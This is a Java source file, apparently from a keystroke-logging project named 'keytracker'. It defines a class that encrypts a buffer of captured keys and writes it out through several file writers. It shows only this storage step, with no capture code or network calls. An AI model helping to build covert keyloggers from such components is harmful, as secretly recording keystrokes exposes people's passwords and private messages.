package com.keytracker;

import com.keytracker.encrypt.Encryptor;
import com.keytracker.file.Writer;

public class CryptedStoreMechanism implements StoreMechanism {
    private final Encryptor encryptor;
    private final Writer[] writers;
    private KeyAppender keyAppender;

    public CryptedStoreMechanism(Encryptor encryptor, Writer... writers) {
        this.encryptor = encryptor;
        this.writers = writers;
    }

    @Override
    public void store() {
//        System.out.print(keyAppender.value());

        String encryptedValue = encryptValue(keyAppender, encryptor);

        for (Writer writer : writers) {
            if (writer != null) writer.write(encryptedValue);
        }
        keyAppender.clear();
    }

    @Override
    public void registerAppender(KeyAppender keyAppender) {
        this.keyAppender = keyAppender;
    }

    private String encryptValue(KeyAppender keyAppender, Encryptor encryptor) {
        String value = keyAppender.value();
        return encryptor != null ? encryptor.encrypt(value) : value;
    }
}

